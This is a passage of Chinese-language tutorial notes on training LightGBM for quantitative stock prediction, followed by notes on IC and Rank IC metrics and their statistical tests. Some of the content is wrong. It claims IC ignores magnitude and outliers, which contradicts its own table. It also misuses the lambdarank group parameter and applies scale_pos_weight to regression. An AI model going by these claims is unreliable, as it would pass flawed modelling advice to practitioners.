&#039;min_data_in_leaf&#039;: [10, 20, 50],\n    &#039;bagging_fraction&#039;: [0.7, 0.8, 0.9],\n    &#039;feature_fraction&#039;: [0.7, 0.8, 0.9],\n}\n \n# 时间序列交叉验证\ntscv = TimeSeriesSplit(n_splits=5)\n \n# 网格搜索\ngrid_search = GridSearchCV(\n    estimator=LGBMRegressor(objective=&#039;regression&#039;, n_estimators=1000),\n    param_grid=param_grid,\n    cv=tscv,\n    scoring=&#039;neg_root_mean_squared_error&#039;,\n    n_jobs=-1,\n    verbose=2\n)\n \ngrid_search.fit(X_train, y_train)\n \nprint(f&quot;最佳参数: {grid_search.best_params_}&quot;)\nprint(f&quot;最佳分数: {-grid_search.best_score_:.4f}&quot;)\n \n# 使用最佳模型\nbest_model = grid_search.best_estimator_\n2. 量化场景下的特殊训练策略\n2.1 针对IC优化的训练\n为什么IC重要？\n在量化投资中，我们关注的是预测值和实际值的排序相关性（IC），而非精确的预测误差（RMSE）。\n自定义损失函数\ndef ic_loss(preds, train_data):\n    &quot;&quot;&quot;\n    基于IC的损失函数\n \n    思路：最大化预测值和真实值的Pearson相关系数\n    &quot;&quot;&quot;\n    labels = train_data.get_label()\n \n    # 计算IC\n    ic = np.corrcoef(preds, labels)[0, 1]\n \n    # 梯度：对IC求导\n    # IC = Cov(pred, label) / (std(pred) * std(label))\n    # dIC/dpred = (label - ic * pred) / (std(pred) * std(label))\n \n    std_pred = np.std(preds)\n    std_label = np.std(labels)\n \n    grad = -(labels - ic * preds) / (std_pred * std_label)\n \n    # Hessian：二阶导数（近似）\n    hess = np.ones_like(preds)\n \n    return grad, hess\n \ndef ic_metric(preds, train_data):\n    &quot;&quot;&quot;IC评估指标&quot;&quot;&quot;\n    labels = train_data.get_label()\n    ic = np.corrcoef(preds, labels)[0, 1]\n    return &#039;ic&#039;, ic, True\n使用自定义损失函数\n# 定义参数\nparams = {\n    &#039;objective&#039;: &#039;custom&#039;,  # 使用自定义目标\n    &#039;metric&#039;: &#039;custom&#039;,\n    &#039;num_leaves&#039;: 31,\n    &#039;learning_rate&#039;: 0.05,\n    &#039;min_data_in_leaf&#039;: 20,\n    &#039;bagging_fraction&#039;: 0.8,\n    &#039;feature_fraction&#039;: 0.8,\n    &#039;bagging_freq&#039;: 5,\n    &#039;verbosity&#039;: -1,\n}\n \n# 训练\nmodel = lgb.train(\n    params,\n    train_data,\n    num_boost_round=1000,\n    valid_sets=[train_data, val_data],\n    fobj=ic_loss,  # 自定义损失函数\n    feval=ic_metric,  # 自定义评估指标\n    callbacks=[\n        lgb.early_stopping(stopping_rounds=50, verbose=True),\n        lgb.log_evaluation(period=100)\n    ]\n)\nRank IC优化\ndef rank_ic_loss(preds, train_data):\n    &quot;&quot;&quot;\n    基于Rank IC的损失函数\n \n    思路：最大化预测值和真实值的Spearman秩相关系数\n    &quot;&quot;&quot;\n    labels = train_data.get_label()\n \n    # 计算排名\n    rank_pred = pd.Series(preds).rank()\n    rank_label = pd.Series(labels).rank()\n \n    # 计算Rank IC\n    rank_ic = np.corrcoef(rank_pred, rank_label)[0, 1]\n \n    # 梯度：近似\n    # 对排名求导比较复杂，这里使用近似方法\n    grad = -(rank_label - rank_ic * rank_pred) / (np.std(rank_pred) * np.std(rank_label))\n    hess = np.ones_like(preds)\n \n    return grad, hess\n \ndef rank_ic_metric(preds, train_data):\n    &quot;&quot;&quot;Rank IC评估指标&quot;&quot;&quot;\n    labels = train_data.get_label()\n    rank_pred = pd.Series(preds).rank()\n    rank_label = pd.Series(labels).rank()\n    rank_ic = np.corrcoef(rank_pred, rank_label)[0, 1]\n    return &#039;rank_ic&#039;, rank_ic, True\n2.2 分组训练（Group-wise Training）\n为什么需要分组？\n量化数据通常有层级结构：\n\n时间维度（不同交易日的样本）\n股票维度（不同股票的样本）\n\n需要保证同一组内的样本不被分到训练集和验证集。\n代码实现\n# 假设我们有时间和股票信息\ntimes = np.arange(len(X)) // 21  # 假设每21个交易日为一个时间组\nstocks = np.arange(len(X)) % 100  # 假设有100只股票\n \n# 创建分组数据集\ntrain_data = lgb.Dataset(X_train, label=y_train, group=times[train_idx])\nval_data = lgb.Dataset(X_val, label=y_val, group=times[val_idx], reference=train_data)\nLambda Rank训练\n# 使用Lambda Rank（适合排序任务）\nparams = {\n    &#039;objective&#039;: &#039;lambdarank&#039;,\n    &#039;metric&#039;: &#039;ndcg&#039;,\n    &#039;num_leaves&#039;: 31,\n    &#039;learning_rate&#039;: 0.05,\n    &#039;min_data_in_leaf&#039;: 20,\n    &#039;verbosity&#039;: -1,\n}\n \nmodel = lgb.train(\n    params,\n    train_data,\n    num_boost_round=1000,\n    valid_sets=[train_data, val_data],\n    callbacks=[\n        lgb.early_stopping(stopping_rounds=50, verbose=True),\n        lgb.log_evaluation(period=100)\n    ]\n)\n2.3 在线学习（Online Learning）\n适用场景\n\n数据源源不断产生\n需要实时更新模型\n市场环境快速变化\n\n增量训练\nclass OnlineLightGBM:\n    &quot;&quot;&quot;\n    在线学习LightGBM\n \n    策略：\n    1. 初始训练：使用历史数据\n    2. 增量更新：定期用新数据更新模型\n    3. 窗口控制：保持训练窗口大小\n    &quot;&quot;&quot;\n \n    def __init__(self, params, window_size=1000, update_freq=100):\n        self.params = params\n        self.window_size = window_size\n        self.update_freq = update_freq\n        self.model = None\n        self.train_data = None\n \n    def initial_train(self, X, y):\n        &quot;&quot;&quot;初始训练&quot;&quot;&quot;\n        self.train_data = lgb.Dataset(X, label=y)\n        self.model = lgb.train(\n            self.params,\n            self.train_data,\n            num_boost_round=1000,\n            callbacks=[\n                lgb.early_stopping(stopping_rounds=50, verbose=True),\n                lgb.log_evaluation(period=100)\n            ]\n        )\n \n    def update(self, X_new, y_new):\n        &quot;&quot;&quot;增量更新&quot;&quot;&quot;\n        if self.train_data is None:\n            self.initial_train(X_new, y_new)\n            return\n \n        # 合并新数据\n        X_train = self.train_data.data\n        y_train = self.train_data.label\n \n        X_combined = np.vstack([X_train, X_new])\n        y_combined = np.hstack([y_train, y_new])\n \n        # 窗口控制\n        if len(X_combined) &gt; self.window_size:\n            X_combined = X_combined[-self.window_size:]\n            y_combined = y_combined[-self.window_size:]\n \n        # 重新训练\n        self.train_data = lgb.Dataset(X_combined, label=y_combined)\n        self.model = lgb.train(\n            self.params,\n            self.train_data,\n            num_boost_round=100,\n            init_model=self.model,  # 继续训练\n            callbacks=[\n                lgb.early_stopping(stopping_rounds=50, verbose=True),\n                lgb.log_evaluation(period=100)\n            ]\n        )\n使用示例\n# 创建在线学习模型\nonline_model = OnlineLightGBM(params, window_size=2520, update_freq=21)\n \n# 初始训练\nX_initial, y_initial = X[:2520], y[:2520]\nonline_model.initial_train(X_initial, y_initial)\n \n# 在线更新\nfor i in range(2520, len(X), 21):\n    X_batch, y_batch = X[i:i+21], y[i:i+21]\n    online_model.update(X_batch, y_batch)\n \n    # 预测\n    y_pred = online_model.model.predict(X[i+21:i+42])\n3. 模型训练进阶技巧\n3.1 学习率调度\n学习率衰减\n# 定义学习率衰减函数\ndef learning_rate_decay(current_iter, total_iter, init_lr=0.1, decay_power=0.99):\n    &quot;&quot;&quot;\n    学习率衰减\n \n    参数:\n        current_iter: 当前迭代次数\n        total_iter: 总迭代次数\n        init_lr: 初始学习率\n        decay_power: 衰减因子\n    &quot;&quot;&quot;\n    return init_lr * (decay_power ** current_iter)\n \n# 在训练中使用\nnum_iterations = 1000\ncallbacks = [\n    lgb.early_stopping(stopping_rounds=50, verbose=True),\n    lgb.log_evaluation(period=100),\n    lgb.reset_parameter(\n        learning_rate=lambda iter: learning_rate_decay(iter, num_iterations, init_lr=0.1, decay_power=0.99)\n    )\n]\n \nmodel = lgb.train(\n    params,\n    train_data,\n    num_boost_round=num_iterations,\n    valid_sets=[train_data, val_data],\n    callbacks=callbacks\n)\n余弦退火\ndef cosine_annealing_lr(current_iter, total_iter, init_lr=0.1, min_lr=0.001):\n    &quot;&quot;&quot;\n    余弦退火学习率\n    &quot;&quot;&quot;\n    cosine = (1 + np.cos(np.pi * current_iter / total_iter)) / 2\n    return min_lr + (init_lr - min_lr) * cosine\n \ncallbacks = [\n    lgb.early_stopping(stopping_rounds=50, verbose=True),\n    lgb.log_evaluation(period=100),\n    lgb.reset_parameter(\n        learning_rate=lambda iter: cosine_annealing_lr(iter, num_iterations, init_lr=0.1, min_lr=0.001)\n    )\n]\n3.2 特征采样策略\n动态特征采样\nclass DynamicFeatureSampler:\n    &quot;&quot;&quot;\n    动态特征采样器\n \n    策略：\n    1. 早期：使用所有特征，快速学习\n    2. 中期：根据特征重要性采样\n    3. 后期：只使用重要特征，精细调优\n    &quot;&quot;&quot;\n \n    def __init__(self, n_features, importance=None):\n        self.n_features = n_features\n        self.importance = importance\n        self.stage = &#039;early&#039;\n \n    def get_feature_fraction(self, iteration, total_iterations):\n        &quot;&quot;&quot;\n        根据迭代阶段返回特征采样比例\n        &quot;&quot;&quot;\n        early_ratio = iteration / total_iterations\n \n        if early_ratio &lt; 0.3:\n            # 早期：使用100%特征\n            return 1.0\n        elif early_ratio &lt; 0.7:\n            # 中期：根据重要性采样\n            return 0.8\n        else:\n            # 后期：只使用重要特征\n            return 0.5\n \n# 使用动态特征采样\nsampler = DynamicFeatureSampler(X.shape[1])\ncallbacks = [\n    lgb.early_stopping(stopping_rounds=50, verbose=True),\n    lgb.log_evaluation(period=100),\n    lgb.reset_parameter(\n        feature_fraction=lambda iter: sampler.get_feature_fraction(iter, num_iterations)\n    )\n]\n3.3 类别不平衡处理\n权重调整\n# 计算正负样本比例\npos_samples = np.sum(y &gt; 0)\nneg_samples = np.sum(y &lt;= 0)\nscale_pos_weight = neg_samples / pos_samples\n \nprint(f&quot;正样本: {pos_samples}, 负样本: {neg_samples}&quot;)\nprint(f&quot;权重比例: {scale_pos_weight:.2f}&quot;)\n \n# 设置参数\nparams = {\n    &#039;objective&#039;: &#039;regression&#039;,\n    &#039;metric&#039;: &#039;rmse&#039;,\n    &#039;scale_pos_weight&#039;: scale_pos_weight,  # 正负样本权重\n    &#039;num_leaves&#039;: 31,\n    &#039;learning_rate&#039;: 0.05,\n    &#039;min_data_in_leaf&#039;: 20,\n    &#039;verbosity&#039;: -1,\n}\n自定义样本权重\n# 计算样本权重\nsample_weights = np.ones_like(y)\n \n# 对难预测样本给予更高权重\ntrain_residuals = y_train - model.predict(X_train)\nresidual_std = np.std(train_residuals)\n \n# 对残差大的样本给予更高权重\nsample_weights = 1 + np.abs(train_residuals) / residual_std\n \n# 创建带权重的数据集\ntrain_data_weighted = lgb.Dataset(X_train, label=y_train, weight=sample_weights)\n \n# 训练\nmodel = lgb.train(\n    params,\n    train_data_weighted,\n    num_boost_round=1000,\n    valid_sets=[train_data_weighted, val_data],\n    callbacks=[\n        lgb.early_stopping(stopping_rounds=50, verbose=True),\n        lgb.log_evaluation(period=100)\n    ]\n)\n3.4 早停机制详解\n早停 (Early Stopping) 的作用：\n训练曲线示意:\n\nMSE ↑\n    │   训练集\n    │     ╲\n    │      ╲─────────────→  继续下降 (记忆数据)\n    │       验证集\n    │         ╲\n    │          ╲___          最佳点\n    │              ╲_______↗\n    │                 ╱ 过拟合开始!\n    │               ╱\n    └────────────────────────→ 迭代次数\n\n工作原理：\n\n每轮计算验证集 MSE\n如果连续 N 轮没有改进 → 停止训练\n返回最佳迭代的模型\n\n代码：\nlgb.early_stopping(stopping_rounds=30)  # 30轮无改进则停止\n完整示例：\n# 训练模型，带早停\nmodel = lgb.train(\n    params,\n    train_data,\n    num_boost_round=500,                # 最多500棵树\n    valid_sets=[train_data, val_data],\n    valid_names=[&#039;train&#039;, &#039;valid&#039;],\n    callbacks=[\n        lgb.early_stopping(stopping_rounds=30),  # 30轮无改进则停止\n        lgb.log_evaluation(period=50)            # 每50轮打印\n    ]\n)\n \n# 示例输出:\n# Training until validation scores don&#039;t improve for 30 rounds\n# [50]    train&#039;s l2: 0.00347577    valid&#039;s l2: 0.00422996\n# Early stopping, best iteration is:\n# [57]    train&#039;s l2: 0.00345507    valid&#039;s l2: 0.00422585\n \nprint(f&quot;✅ 训练完成!&quot;)\nprint(f&quot;   训练时间: 0:00:00.584752&quot;)\nprint(f&quot;   最佳迭代: {model.best_iteration}&quot;)\nprint(f&quot;   树的数量: {model.num_trees()}&quot;)\n3.5 预测与简单评估\n# 预测\ny_pred_train = model.predict(X_train)\ny_pred_valid = model.predict(X_valid)\ny_pred_test = model.predict(X_test)\n \n# 简单评估\nfrom sklearn.metrics import mean_squared_error, r2_score\n \nmse_train = mean_squared_error(y_train, y_pred_train)\nmse_valid = mean_squared_error(y_valid, y_pred_valid)\nmse_test = mean_squared_error(y_test, y_pred_test)\n \nprint(f&quot;MSE 评估:&quot;)\nprint(f&quot;  训练集: {mse_train:.6f}&quot;)\nprint(f&quot;  验证集: {mse_valid:.6f}&quot;)\nprint(f&quot;  测试集: {mse_test:.6f}&quot;)\n \n# 检查过拟合\nif mse_train &lt; mse_valid * 0.5:\n    print(f&quot;⚠️ 警告: 训练集 MSE 远低于验证集，可能过拟合!&quot;)\nelse:\n    print(f&quot;✅ 过拟合检查通过&quot;)\n3.6 早停策略优化\n多层早停\nclass MultiLevelEarlyStopping:\n    &quot;&quot;&quot;\n    多层早停策略\n \n    策略：\n    1. 训练集指标：监控过拟合\n    2. 验证集IC：监控预测能力\n    3. IC衰减：监控性能衰减\n    &quot;&quot;&quot;\n \n    def __init__(self, stopping_rounds=100, min_delta=0.001):\n        self.stopping_rounds = stopping_rounds\n        self.min_delta = min_delta\n        self.best_ic = -np.inf\n        self.best_round = 0\n        self.ic_history = []\n \n    def __call__(self, env):\n        &quot;&quot;&quot;\n        回调函数\n        &quot;&quot;&quot;\n        # 获取验证集IC\n        val_data = env.validation_data\n        y_pred = env.model.predict(val_data.data)\n        y_true = val_data.label\n        ic = np.corrcoef(y_pred, y_true)[0, 1]\n \n        self.ic_history.append(ic)\n \n        # 检查是否提升\n        if ic &gt; self.best_ic + self.min_delta:\n            self.best_ic = ic\n            self.best_round = env.iteration\n        elif env.iteration - self.best_round &gt;= self.stopping_rounds:\n            # 早停\n            raise StopIteration\n \n        print(f&quot;Round {env.iteration}: IC = {ic:.4f}, Best IC = {self.best_ic:.4f}&quot;)\n \n# 使用多层早停\ncallbacks = [\n    lgb.log_evaluation(period=100),\n    MultiLevelEarlyStopping(stopping_rounds=100, min_delta=0.001)\n]\n4. 分布式训练\n4.1 多GPU训练\n# 使用多GPU训练\nparams = {\n    &#039;objective&#039;: &#039;regression&#039;,\n    &#039;metric&#039;: &#039;rmse&#039;,\n    &#039;num_leaves&#039;: 31,\n    &#039;learning_rate&#039;: 0.05,\n    &#039;device&#039;: &#039;gpu&#039;,  # 使用GPU\n    &#039;gpu_platform_id&#039;: 0,\n    &#039;gpu_device_id&#039;: 0,\n    &#039;num_gpu&#039;: 2,  # 使用2个GPU\n    &#039;verbosity&#039;: -1,\n}\n \nmodel = lgb.train(\n    params,\n    train_data,\n    num_boost_round=1000,\n    valid_sets=[train_data, val_data],\n    callbacks=[\n        lgb.early_stopping(stopping_rounds=50, verbose=True),\n        lgb.log_evaluation(period=100)\n    ]\n)\n4.2 多机训练\n# 假设有多个机器，每台机器处理一部分数据\n \n# 主机（master）\nparams = {\n    &#039;objective&#039;: &#039;regression&#039;,\n    &#039;metric&#039;: &#039;rmse&#039;,\n    &#039;num_leaves&#039;: 31,\n    &#039;learning_rate&#039;: 0.05,\n    &#039;tree_learner&#039;: &#039;data_parallel&#039;,  # 数据并行\n    &#039;num_machines&#039;: 4,  # 4台机器\n    &#039;machines&#039;: &#039;192.168.1.1:12345,192.168.1.2:12345,192.168.1.3:12345,192.168.1.4:12345&#039;,\n    &#039;verbosity&#039;: -1,\n}\n \nmodel = lgb.train(\n    params,\n    train_data,\n    num_boost_round=1000,\n    valid_sets=[train_data, val_data],\n    callbacks=[\n        lgb.early_stopping(stopping_rounds=50, verbose=True),\n        lgb.log_evaluation(period=100)\n    ]\n)\n5. 模型保存与加载\n5.1 保存模型\n# 保存模型\nmodel.save_model(&#039;lightgbm_model.txt&#039;)\n \n# 保存为JSON格式（更易读）\nmodel.save_model(&#039;lightgbm_model.json&#039;)\n \n# 保存模型和数据\nimport joblib\njoblib.dump(model, &#039;lightgbm_model.pkl&#039;)\n5.2 加载模型\n# 加载模型\nmodel = lgb.Booster(model_file=&#039;lightgbm_model.txt&#039;)\n \n# 加载并继续训练\nmodel = lgb.Booster(model_file=&#039;lightgbm_model.txt&#039;)\nmodel = lgb.train(\n    params,\n    train_data,\n    num_boost_round=100,\n    init_model=model,  # 继续训练\n    valid_sets=[train_data, val_data],\n    callbacks=[\n        lgb.early_stopping(stopping_rounds=50, verbose=True),\n        lgb.log_evaluation(period=100)\n    ]\n)\n5.3 模型版本管理\nimport os\nimport json\nfrom datetime import datetime\n \nclass ModelVersioning:\n    &quot;&quot;&quot;\n    模型版本管理\n \n    功能：\n    1. 保存模型及其元数据\n    2. 版本控制\n    3. 模型比较\n    &quot;&quot;&quot;\n \n    def __init__(self, model_dir=&#039;models&#039;):\n        self.model_dir = model_dir\n        os.makedirs(model_dir, exist_ok=True)\n \n    def save_model(self, model, metadata):\n        &quot;&quot;&quot;\n        保存模型及元数据\n \n        metadata: {\n            &#039;train_ic&#039;: 0.05,\n            &#039;val_ic&#039;: 0.03,\n            &#039;params&#039;: {...},\n            &#039;train_date&#039;: &#039;2024-01-01&#039;,\n            ...\n        }\n        &quot;&quot;&quot;\n        version = datetime.now().strftime(&#039;%Y%m%d_%H%M%S&#039;)\n        model_name = f&quot;model_{version}&quot;\n \n        # 保存模型\n        model_path = os.path.join(self.model_dir, f&quot;{model_name}.txt&quot;)\n        model.save_model(model_path)\n \n        # 保存元数据\n        metadata_path = os.path.join(self.model_dir, f&quot;{model_name}_metadata.json&quot;)\n        with open(metadata_path, &#039;w&#039;) as f:\n            json.dump(metadata, f, indent=2)\n \n        print(f&quot;模型已保存: {model_name}&quot;)\n \n        return model_name\n \n    def load_model(self, model_name):\n        &quot;&quot;&quot;加载模型&quot;&quot;&quot;\n        model_path = os.path.join(self.model_dir, f&quot;{model_name}.txt&quot;)\n        metadata_path = os.path.join(self.model_dir, f&quot;{model_name}_metadata.json&quot;)\n \n        # 加载模型\n        model = lgb.Booster(model_file=model_path)\n \n        # 加载元数据\n        with open(metadata_path, &#039;r&#039;) as f:\n            metadata = json.load(f)\n \n        return model, metadata\n \n    def list_models(self):\n        &quot;&quot;&quot;列出所有模型&quot;&quot;&quot;\n        models = []\n        for file in os.listdir(self.model_dir):\n            if file.endswith(&#039;.txt&#039;):\n                model_name = file.replace(&#039;.txt&#039;, &#039;&#039;)\n                metadata_path = os.path.join(self.model_dir, f&quot;{model_name}_metadata.json&quot;)\n \n                if os.path.exists(metadata_path):\n                    with open(metadata_path, &#039;r&#039;) as f:\n                        metadata = json.load(f)\n                    models.append((model_name, metadata))\n \n        return models\n使用示例\n# 创建版本管理器\nversion_manager = ModelVersioning()\n \n# 保存模型\nmetadata = {\n    &#039;train_ic&#039;: train_ic,\n    &#039;val_ic&#039;: val_ic,\n    &#039;params&#039;: params,\n    &#039;train_date&#039;: datetime.now().strftime(&#039;%Y-%m-%d&#039;),\n    &#039;train_samples&#039;: len(X_train),\n    &#039;val_samples&#039;: len(X_val),\n}\n \nmodel_name = version_manager.save_model(model, metadata)\n \n# 列出所有模型\nmodels = version_manager.list_models()\nfor name, meta in models:\n    print(f&quot;{name}: IC={meta[&#039;val_ic&#039;]:.4f}, Date={meta[&#039;train_date&#039;]}&quot;)\n6. 总结\nLightGBM模型训练在量化场景中需要特别关注：\n\n训练流程：数据准备、参数设置、模型训练、评估\n特殊训练策略：针对IC优化、分组训练、在线学习\n进阶技巧：学习率调度、特征采样、类别不平衡处理\n分布式训练：多GPU、多机训练\n模型管理：保存、加载、版本控制\n\n正确的训练策略是提升模型性能的关键，需要根据具体场景灵活调整。"},"quant/qlib/week2/04-IC-Rank-IC评估指标":{"slug":"quant/qlib/week2/04-IC-Rank-IC评估指标","filePath":"quant/qlib/week2/04-IC-Rank-IC评估指标.md","title":"04-IC-Rank-IC评估指标","links":[],"tags":[],"content":"IC/Rank IC 评估指标\n1. IC（Information Coefficient）基础\n1.1 IC的定义\n数学定义\nIC（Information Coefficient，信息系数）是预测值与实际值的Pearson相关系数：\nIC = \\rho(\\hat{y}, y) = \\frac{Cov(\\hat{y}, y)}{\\sigma_{\\hat{y}} \\sigma_y}\n其中：\n\n\\hat{y} 是预测值（预测收益率）\ny 是实际值（实际收益率）\n\\rho 是Pearson相关系数\nCov 是协方差\n\\sigma 是标准差\n\n取值范围\n\nIC ∈ [-1, 1]\nIC = 1：完全正相关，预测完全准确\nIC = 0：无相关性，预测无效\nIC = -1：完全负相关，预测完全相反\n\n计算示例\nimport numpy as np\nfrom scipy.stats import pearsonr\n \n# 假设我们有预测值和实际值\ny_pred = np.array([0.01, 0.02, -0.01, 0.03, 0.005])\ny_true = np.array([0.015, 0.025, -0.005, 0.035, 0.01])\n \n# 计算IC\nic = pearsonr(y_pred, y_true)[0]\nprint(f&quot;IC = {ic:.4f}&quot;)\n \n# 手动计算\ndef calculate_ic(y_pred, y_true):\n    mean_pred = np.mean(y_pred)\n    mean_true = np.mean(y_true)\n \n    std_pred = np.std(y_pred)\n    std_true = np.std(y_true)\n \n    covariance = np.mean((y_pred - mean_pred) * (y_true - mean_true))\n    ic = covariance / (std_pred * std_true)\n \n    return ic\n \nic_manual = calculate_ic(y_pred, y_true)\nprint(f&quot;手动计算 IC = {ic_manual:.4f}&quot;)\n1.2 IC在量化中的意义\n量化投资的核心问题\n量化投资的核心是预测股票的相对强弱，而非精确的收益率预测。\nIC的优势\n\n非线性不敏感：只关心排序，不关心绝对值\n稳健性：对异常值不敏感\n可解释性：直接衡量预测能力\n\nIC与收益的关系\n假设我们根据预测值构建多空组合：\n\\text{Return}_{t} = \\frac{1}{N_{\\text{long}}} \\sum_{i \\in \\text{long}} r_{i,t} - \\frac{1}{N_{\\text{short}}} \\sum_{i \\in \\text{short}} r_{i,t}\n其中多空组合根据预测值排序选择。\n理论上，IC越高，组合收益越高：\nE[\\text{Return}] \\propto IC \\times \\sigma_r\n其中 \\sigma_r 是收益率的标准差。\n2. Rank IC\n2.1 Rank IC的定义\n数学定义\nRank IC是预测值排序与实际值排序的Spearman秩相关系数：\n\\text{Rank IC} = \\rho(\\text{rank}(\\hat{y}), \\text{rank}(y))\n其中 \\text{rank}(\\cdot) 是排名函数。\n计算示例\nfrom scipy.stats import spearmanr\n \n# 假设我们有预测值和实际值\ny_pred = np.array([0.01, 0.02, -0.01, 0.03, 0.005])\ny_true = np.array([0.015, 0.025, -0.005, 0.035, 0.01])\n \n# 计算Rank IC\nrank_ic = spearmanr(y_pred, y_true)[0]\nprint(f&quot;Rank IC = {rank_ic:.4f}&quot;)\n \n# 手动计算\ndef calculate_rank_ic(y_pred, y_true):\n    rank_pred = pd.Series(y_pred).rank()\n    rank_true = pd.Series(y_true).rank()\n \n    # 使用Pearson相关系数计算排名的相关性\n    ic = pearsonr(rank_pred, rank_true)[0]\n \n    return ic\n \nrank_ic_manual = calculate_rank_ic(y_pred, y_true)\nprint(f&quot;手动计算 Rank IC = {rank_ic_manual:.4f}&quot;)\n2.2 IC与Rank IC的区别\n区别对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性ICRank IC相关系数类型PearsonSpearman敏感性对数值敏感只对排序敏感异常值敏感不敏感适用场景线性关系单调关系计算复杂度O(N)O(N log N)\n数值示例\n# 示例：异常值的影响\ny_pred = np.array([0.01, 0.02, -0.01, 0.03, 0.005])\ny_true = np.array([0.015, 0.025, -0.005, 0.035, 0.01])\n \n# 加入异常值\ny_pred_outlier = np.array([0.01, 0.02, -0.01, 0.03, 10.0])  # 第5个值异常大\ny_true_outlier = np.array([0.015, 0.025, -0.005, 0.035, 0.01])\n \n# 计算IC\nic_normal = pearsonr(y_pred, y_true)[0]\nic_outlier = pearsonr(y_pred_outlier, y_true_outlier)[0]\n \n# 计算Rank IC\nrank_ic_normal = spearmanr(y_pred, y_true)[0]\nrank_ic_outlier = spearmanr(y_pred_outlier, y_true_outlier)[0]\n \nprint(f&quot;正常数据: IC = {ic_normal:.4f}, Rank IC = {rank_ic_normal:.4f}&quot;)\nprint(f&quot;异常数据: IC = {ic_outlier:.4f}, Rank IC = {rank_ic_outlier:.4f}&quot;)\n \n# 结果：IC受异常值影响大，Rank IC几乎不变\n量化场景的选择\n在量化投资中，通常更关注Rank IC，因为：\n\n我们关注的是股票的相对排名\n收益率存在异常值（涨跌停、停牌等）\n排序比精确值更稳定\n\n3. IC的统计显著性检验\n3.1 t检验\n假设检验\n\nH0（原假设）：IC = 0（预测无能力）\nH1（备择假设）：IC ≠ 0（预测有能力）\n\n检验统计量\nt = \\frac{IC \\times \\sqrt{N - 2}}{\\sqrt{1 - IC^2}}\n其中 N 是样本数量。\n代码实现\nfrom scipy.stats import t\n \ndef ic_t_test(ic, n_samples, alpha=0.05):\n    &quot;&quot;&quot;\n    IC的t检验\n \n    参数:\n        ic: IC值\n        n_samples: 样本数量\n        alpha: 显著性水平\n \n    返回:\n        t_statistic: t统计量\n        p_value: p值\n        is_significant: 是否显著\n    &quot;&quot;&quot;\n    # 计算t统计量\n    t_statistic = ic * np.sqrt(n_samples - 2) / np.sqrt(1 - ic ** 2)\n \n    # 计算p值（双尾检验）\n    p_value = 2 * (1 - t.cdf(abs(t_statistic), df=n_samples - 2))\n \n    # 判断显著性\n    is_significant = p_value &lt; alpha\n \n    return t_statistic, p_value, is_significant\n \n# 示例\nic = 0.05\nn_samples = 252  # 一年的交易日\n \nt_stat, p_val, sig = ic_t_test(ic, n_samples)\n \nprint(f&quot;IC = {ic:.4f}&quot;)\nprint(f&quot;t统计量 = {t_stat:.4f}&quot;)\nprint(f&quot;p值 = {p_val:.4f}&quot;)\nprint(f&quot;是否显著: {sig}&quot;)\n3.2 IC的置信区间\n置信区间计算\nIC的置信区间可以通过Fisher变换计算：\nz = \\frac{1}{2} \\ln\\left(\\frac{1 + IC}{1 - IC}\\right)\nz的标准误差：\nSE_z = \\frac{1}{\\sqrt{N - 3}}\n置信区间：\nCI_{IC} = \\tanh\\left(z \\pm z_{1-\\alpha/2} \\times SE_z\\right)\n代码实现\nfrom scipy.stats import norm\n \ndef ic_confidence_interval(ic, n_samples, alpha=0.05):\n    &quot;&quot;&quot;\n    IC的置信区间\n \n    参数:\n        ic: IC值\n        n_samples: 样本数量\n        alpha: 显著性水平\n \n    返回:\n        (lower, upper): 置信区间\n    &quot;&quot;&quot;\n    # Fisher变换\n    z = 0.5 * np.log((1 + ic) / (1 - ic))\n \n    # 计算标准误差\n    se_z = 1 / np.sqrt(n_samples - 3)\n \n    # 计算置信区间\n    z_critical = norm.ppf(1 - alpha / 2)\n    z_lower = z - z_critical * se_z\n    z_upper = z + z_critical * se_z\n \n    # 反Fisher变换\n    ic_lower = np.tanh(z_lower)\n    ic_upper = np.tanh(z_upper)\n \n    return ic_lower, ic_upper\n \n# 示例\nic = 0.05\nn_samples = 252\n \nlower, upper = ic_confidence_interval(ic, n_samples)\nprint(f&quot;IC = {ic:.4f}&quot;)\nprint(f&quot;95%置信区间: [{lower:.4f}, {upper:.4f}]&quot;)\n4. IC的时序分析\n4.1 滚动IC\n滚动IC的定义\n滚动IC是在固定时间窗口内计算的IC序列，用于分析IC的稳定性。\n代码实现\ndef rolling_ic(y_pred, y_true, window=20):\n    &quot;&quot;&quot;\n    滚动IC计算\n \n    参数:\n        y_pred: 预测值序列，shape=[n_samples]\n        y_true: 实际值序列，shape=[n_samples]\n        window: 滚动窗口大小\n \n    返回:\n        ic_series: IC序列\n    &quot;&quot;&quot;\n    n_samples = len(y_pred)\n    ic_series = []\n \n    for i in range(window, n_samples + 1):\n        window_pred = y_pred[i-window:i]\n        window_true = y_true[i-window:i]\n \n        ic = pearsonr(window_pred, window_true)[0]\n        ic_series.append(ic)\n \n    return np.array(ic_series)\n \n# 示例\ny_pred = np.random.randn(500)\ny_true = y_pred * 0.5 + np.random.randn(500) * 0.5\n \nic_series = rolling_ic(y_pred, y_true, window=20)\n \nprint(f&quot;平均IC: {np.mean(ic_series):.4f}&quot;)\nprint(f&quot;IC标准差: {np.std(ic_series):.4f}&quot;)\nprint(f&quot;IC最大值: {np.max(ic_series):.4f}&quot;)\nprint(f&quot;IC最小值: {np.min(ic_series):.4f}&quot;)\n滚动IC可视化\nimport matplotlib.pyplot as plt\n \ndef plot_rolling_ic(y_pred, y_true, window=20):\n    &quot;&quot;&quot;\n    绘制滚动IC\n    &quot;&quot;&quot;\n    ic_series = rolling_ic(y_pred, y_true, window)\n \n    plt.figure(figsize=(12, 6))\n    plt.plot(ic_series, label=&#039;Rolling IC&#039;)\n    plt.axhline(y=0, color=&#039;r&#039;, linestyle=&#039;--&#039;, label=&#039;Zero Line&#039;)\n    plt.axhline(y=np.mean(ic_series), color=&#039;g&#039;, linestyle=&#039;--&#039;, label=&#039;Mean IC&#039;)\n    plt.xlabel(&#039;Time&#039;)\n    plt.ylabel(&#039;IC&#039;)\n    plt.title(f&#039;Rolling IC (Window={window})&#039;)\n    plt.legend()\n    plt.grid(True)\n    plt.show()\n \n# 使用示例\nplot_rolling_ic(y_pred, y_true, window=20)\n4.2 IC衰减分析\nIC衰减的定义\nIC衰减是指预测值与未来不同周期实际值的IC，用于分析预测的时效性。\n代码实现\ndef ic_decay(y_pred, y_true, max_lag=10):\n    &quot;&quot;&quot;\n    IC衰减分析\n \n    参数:\n        y_pred: 预测值序列\n        y_true: 实际值序列\n        max_lag: 